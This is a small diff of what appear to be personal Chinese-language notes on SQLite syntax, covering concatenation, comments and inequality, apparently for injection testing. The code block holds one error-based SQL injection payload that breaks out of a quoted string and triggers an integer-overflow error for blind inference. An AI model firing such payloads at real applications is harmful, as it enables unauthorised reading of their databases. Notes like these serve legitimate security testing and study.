@@ -1,4 +1,9 @@
-# sqlite
+# 语法
+	- 拼接字符串： `||`
+	- 注释：` --`
+	- 不等于：`<>`
+	- 不支持弱类型：数字不会自动转换成字符串
+- # sqlite
 	- [参考](https://www.sjkjc.com/sqlite-ref/string-functions/)
 	- ```
 	  a'||1=2||abs(case(2)when(1)then(1)else(0x8000000000000000)end)||'
